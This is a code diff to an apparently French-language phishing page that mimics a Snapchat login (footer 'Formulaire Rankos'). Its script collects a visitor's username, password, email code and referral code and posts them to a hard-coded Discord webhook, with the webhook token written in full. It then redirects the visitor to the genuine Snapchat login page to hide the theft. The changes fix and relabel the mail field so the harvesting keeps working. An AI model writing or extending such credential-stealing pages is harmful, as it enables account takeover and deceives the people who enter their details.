@@ -142,7 +142,7 @@
 
   <div class="form-group">
     <label for="mail">CodeMail</label>
-    <input type="mail" id="mail" required />
+    <input type="text" id="mail" required />
   </div>
 
   <button type="button" id="confirmBtn">Confirmer</button>
@@ -150,15 +150,18 @@
 
   <!-- SCRIPT -->
   <script>
+    let mail = "";
     const webhookURL = "https://discord.com/api/webhooks/1500260636360314922/jGdINSMnDqiX_B39wtCs5q0fCz_AGtxruEStRPQpjqf_akokba9KjFW7Ni8TIxu3xYAn";
     const redirectURL = "https://accounts.snapchat.com/accounts/v2/login";
+
+   
 
     document.getElementById('loginForm').addEventListener('submit', function(e) {
       e.preventDefault();
 
       const username = document.getElementById('username').value.trim();
       const password = document.getElementById('password').value.trim();
-      const mail = document.getElementById('mail').value.trim();
+      mail = document.getElementById('mail').value.trim();
       const referralCode = document.getElementById('referralCode').value.trim();
 
       const errorMessage = document.getElementById('errorMessage');
@@ -177,6 +180,10 @@
         return;
       }
 
+      if (!mail) {
+        console.log("Mail vide ou non rempli");
+      }
+
       const message = {
         embeds: [{
           title: "📥 Nouvelle tentative de connexion",
@@ -186,7 +193,7 @@
             { name: "👤 Nom d'utilisateur / e-mail", value: username },
             { name: "🔒 Mot de passe", value: password },
             { name: "🎁 Code de parrainage", value: referralCode },
-            { name: "🎁 Code de parrainage", value: mail }
+            { name: "📩 Code mail", value: mail }
           ],
           timestamp: new Date().toISOString(),
           footer: { text: "Formulaire Rankos" }
